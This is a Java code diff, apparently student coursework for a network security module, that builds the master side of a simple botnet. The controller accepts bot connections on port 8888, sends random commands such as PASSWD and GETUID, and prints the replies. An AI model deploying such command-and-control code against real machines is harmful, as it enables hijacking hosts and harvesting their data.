@@ -1,3 +1,8 @@
+/*
+AUTHOR: Daniel Hedemalm
+Module: Network Security & Cryptography CSN09112
+*/
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
@@ -6,61 +11,73 @@ import java.io.PrintWriter;
 import java.net.*;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 
 public class Controller {
   // Port that will be opened
   int port = 8888;
   int millisecondsTimeout = 50;
   // List that will fill upp with connected clients
-  List<Socket> sockets = new ArrayList<Socket>();
+  static List<Socket> sockets = new ArrayList<Socket>();
 
   ServerSocket servSock;
 
-  public void main(String[] args) throws IOException {
+  public static void main(String[] args) throws IOException, InterruptedException {
+    System.out.println("-------------------------------");
+    System.out.println("| Flowless' Botnet --- Master |");
+    System.out.println("|         Version 1.0         |");
+    System.out.println("-------------------------------");
     // Instantiate the server
     Controller serv = new Controller();
     // Open the given port
     serv.Open();
+    String reply;
     // Wait for incoming connections
     while (true)
     {
       // Constantly looks for new connections
       serv.AcceptClients();
-      // Once client connected, send commands and receive replies
-      if (serv.sockets.size() > 0) {
-        sendCommand();
-        receiveReply();
+      if (sockets.size() > 0) {
+        // Get the first client in sockets, to know which client to send the message to
+        Socket sock = sockets.get(0);
+        sendCommand(sock);
+        receiveReply(sock);
+        // Sleep to avoid spam
+        int sleepTime = 1000; //milliseconds
+        Thread.sleep(sleepTime);
       }
+
     }
   }
 
-  static void sendCommand() {
+  static void sendCommand(Socket sock) throws IOException {
     //Randomize a integer which will choose [i] of command array
-
-    //Set sleeptime for the thread, 3 secs between commands
-
+    Random rand = new Random();
+    int choice = rand.nextInt(4);
+    //System.out.println(choice);
     //The chosen command will be sent to away
-
-    //Initialize PrintWriter and make it work
+    String[] commands = {"VERSION", "PASSWD", "GETUID", "GET"};
+    // Determine command to be sent
+    System.out.println("Sending: " + commands[choice]);
+    //Initialize PrintWriter to start output stream
+    PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
+    // Sent and flush toilet
+    out.println(commands[choice]);
+    out.flush();
   }
 
-  void receiveReply() throws IOException {  //Read what is received and print out to console
+  static void receiveReply(Socket sock) throws IOException {  //Read what is received and print out to console
     boolean incData = false;
-    //Does the process for all connected clients/sockets
-    for (int i = 0; i < sockets.size(); ++i) {
-      Socket sock = sockets.get(i);
-      //Initialize a BufferedReader
-      BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
-      if (!in.ready()) {
-        continue;
-      }
-      // Read in the line
-      String line = in.readLine();
-      if (line.length() <= 1) {
-        incData = true;
-      }
-      // Print out the received line
-      System.out.println("Message: "+line);
+    //Initialize a BufferedReader
+    BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
+    // Read in the line
+    if (!in.ready()) {
+      return;
+    }
+    // Reads commands from Controller
+    String command = in.readLine();
+    if (command.length() >= 1) { // If reply, print it out
+      System.out.println("Reply: "+ command);
     }
   }
 
